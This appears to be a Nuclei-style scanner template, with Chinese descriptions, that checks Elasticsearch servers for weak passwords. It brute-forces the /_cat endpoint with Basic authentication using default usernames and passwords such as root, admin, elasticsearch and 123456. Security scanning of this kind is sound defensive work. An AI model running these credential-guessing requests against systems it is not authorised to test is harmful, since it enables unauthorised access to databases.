id: es弱口令

info:
  name: es数据库弱口令
  severity: critical
  description: Elasticsearch服务使用了弱口令，攻击者可以通过爆破获取权限
  remediation: 使用多种字符组合的强密码，如大小写字母+数字+特殊字符
  tags: elasticsearch

http:
  - raw:
      - |
        GET /_cat HTTP/1.1
        Host: {{BaseURL}}      

      - |
        GET /_cat HTTP/1.1
        Host: {{BaseURL}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Authorization: Basic {{base64(username + ':' + password)}}

    attack: clusterbomb
    payloads:
      username:
        - 'root'
        - 'admin'
        - 'elasticsearch'
      password:
        - 'root'
        - 'admin'
        - 'elasticsearch'
        - '123456'
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '/_cat/master'
      - type: status
        status:
          - 200